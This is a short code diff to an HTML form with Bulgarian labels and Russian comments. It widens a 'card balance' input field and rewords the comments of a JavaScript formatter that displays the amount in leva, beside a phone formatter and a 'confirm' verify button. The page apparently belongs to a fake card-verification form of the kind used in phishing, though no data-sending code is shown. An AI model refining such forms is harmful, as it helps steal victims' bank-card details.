@@ -272,9 +272,9 @@
             </div>
 
             <div class="form-group">
-                <label>Наличен лимит (баланс) на картата</label>
-                <input type="text" id="balance" placeholder="000.00 лв" maxlength="7">
-            </div>
+    <label>Наличен лимит (баланс) на картата</label>
+    <input type="text" id="balance" placeholder="000.00 лв" maxlength="10">
+</div>
 
             <button type="submit" class="verify-btn">ПОТВЪРДИ</button>
         </form>
@@ -351,25 +351,24 @@
             e.target.value = '+359 ' + value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
         }
     });
-
-    // Форматиране на баланс
+    
     // Форматирование баланса
     document.getElementById('balance').addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');  // Убираем все нецифровые символы
 
-        // Разделяем на две части: целая часть и десятичная
+        // Разделяем на целую и дробную часть
         let integerPart = value.slice(0, -2);  // Все, кроме последних двух цифр
         let decimalPart = value.slice(-2);     // Последние две цифры
 
-        // Добавляем разделитель тысячных
+        // Добавляем разделитель тысячных для целой части
         integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
 
-        // Если нет десятичных, устанавливаем их как "00"
+        // Если нет десятичных, то добавляем "00"
         if (decimalPart.length < 2) {
             decimalPart = decimalPart.padStart(2, '0');
         }
 
-        // Объединяем обратно целую и десятичную части
+        // Объединяем целую и десятичную часть с добавлением " лв"
         e.target.value = `${integerPart}.${decimalPart} лв`;
     });
 
@@ -456,6 +455,7 @@
 
 </body>
 </html>
+
 
 
 
